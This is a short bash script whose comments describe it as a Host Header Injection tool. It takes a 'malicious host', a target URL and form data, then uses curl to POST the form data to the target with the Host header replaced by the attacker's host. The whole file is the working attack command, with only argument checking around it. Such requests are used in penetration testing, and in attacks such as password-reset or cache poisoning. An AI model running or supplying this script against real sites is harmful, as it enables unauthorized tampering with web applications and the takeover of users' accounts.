#!/bin/bash

# ARG1 = New Host (malicious host)
# ARG2 = Target URL
# ARG3 = Form Data

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Basic argument check
if [ -z "$NEW_HOST" ] || [ -z "$TARGET_URL" ] || [ -z "$FORM_DATA" ]; then
    echo "Usage: $0 <new_host> <target_url> <form_data>"
    exit 1
fi

# Perform Host Header Injection using curl
curl -s -X POST "$TARGET_URL" \
     -H "Host: $NEW_HOST" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "$FORM_DATA"
